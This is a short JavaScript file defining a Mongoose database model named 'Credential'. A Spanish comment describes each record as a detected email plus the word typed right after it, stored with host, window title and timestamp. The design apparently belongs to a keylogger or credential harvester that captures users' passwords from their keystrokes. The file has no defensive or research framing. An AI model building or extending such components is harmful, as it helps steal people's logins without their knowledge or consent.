const mongoose = require('mongoose');

// Credencial detectada: un email seguido de la palabra que viene justo despues.
const credentialSchema = new mongoose.Schema({
  host:      { type: String, index: true },
  window:    { type: String },
  email:     { type: String, required: true, index: true },
  nextWord:  { type: String, default: '' },
  timestamp: { type: Date, default: Date.now, index: true }
});

module.exports = mongoose.model('Credential', credentialSchema);
